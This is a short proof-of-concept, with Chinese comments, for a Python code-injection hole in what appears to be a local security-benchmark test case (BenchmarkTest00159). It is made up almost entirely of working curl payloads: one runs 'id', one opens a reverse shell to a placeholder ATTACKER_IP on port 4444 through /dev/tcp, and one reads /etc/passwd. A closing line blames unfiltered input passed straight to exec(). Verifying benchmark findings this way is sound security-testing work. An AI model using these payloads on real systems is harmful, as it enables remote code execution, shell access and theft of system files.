# 任意Python代码执行
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00159' \
  -d 'BenchmarkTest00159=__import__("os").system("id")'

# 或反弹shell（需调整host/port）
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00159' \
  -d 'BenchmarkTest00159=__import__("os").system("bash -c \"bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1\"")'

# 读文件
curl -X POST 'http://localhost:8443/benchmark/codeinj-00/BenchmarkTest00159' \
  -d 'BenchmarkTest00159=print(__import__("os").popen("cat /etc/passwd").read())'

原理：参数值经过列表去首元素后直接成为 exec() 的参数，未做任何过滤或白名单校验。